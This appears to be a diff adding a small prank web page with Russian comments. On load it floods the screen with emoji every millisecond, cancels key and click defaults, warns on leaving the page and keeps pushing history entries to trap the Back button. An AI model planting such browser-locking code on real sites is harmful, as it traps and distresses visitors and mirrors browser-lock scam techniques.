@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#007bff">
+    <title>о Жизни</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            color: #444;
+            z-index: 10;
+        }
+
+        #emojiContainer {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: flex-start;
+            justify-content: center;
+            overflow: auto;
+            padding: 10px;
+            z-index: 10;
+        }
+
+        /* Заглушка для блокировки страницы */
+        #blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 250, 0, 0.5); /* Прозрачный белый слой */
+            z-index: 999; /* Самый высокий слой */
+        }
+    </style>
+</head>
+<body>
+
+    <h1>⚠️</h1>
+    <div id="emojiContainer"></div>
+    <!--div id="blocker"></div> <!-- Заглушка для блокировки страницы -->
+
+    <script>
+        function addEmoji() {
+            const emojiContainer = document.getElementById('emojiContainer');
+            console.log(emojiContainer)
+            const emoji = document.createElement('span');
+            emoji.textContent = "🤪👾☣️";  // Можно заменить на любой другой смайлик
+            emoji.style.fontSize = `${Math.random() * 20 + 20}px`; // Рандомный размер
+            emoji.style.margin = '5px';
+
+            emojiContainer.appendChild(emoji);
+        }
+
+        // Бесконечное добавление смайликов
+        setInterval(addEmoji, 1); // Каждые 100 миллисекунд добавляется новый смайлик
+
+        // Блокировка нажатий клавиш и мыши
+        document.addEventListener('keydown', function(event) {
+            event.preventDefault();
+        });
+
+        document.addEventListener('click', function(event) {
+            event.preventDefault();
+        });
+
+        // Блокировка перезагрузки страницы
+        window.onbeforeunload = function(event) {
+            event.preventDefault();
+            event.returnValue = ''; // Это показывает предупреждение при попытке покинуть страницу
+        };
+
+        // Блокировка кнопки "Назад"
+        function blockBackButton() {
+            window.history.pushState(null, null, window.location.href);
+        }
+
+        window.onload = function() {
+            // Блокировка кнопки "Назад"
+            blockBackButton();
+            window.onpopstate = function () {
+                blockBackButton();
+            };
+
+            // Регулярное обновление истории, чтобы избежать возврата
+            setInterval(blockBackButton, 10);
+        };
+    </script>
+
+</body>
+</html>
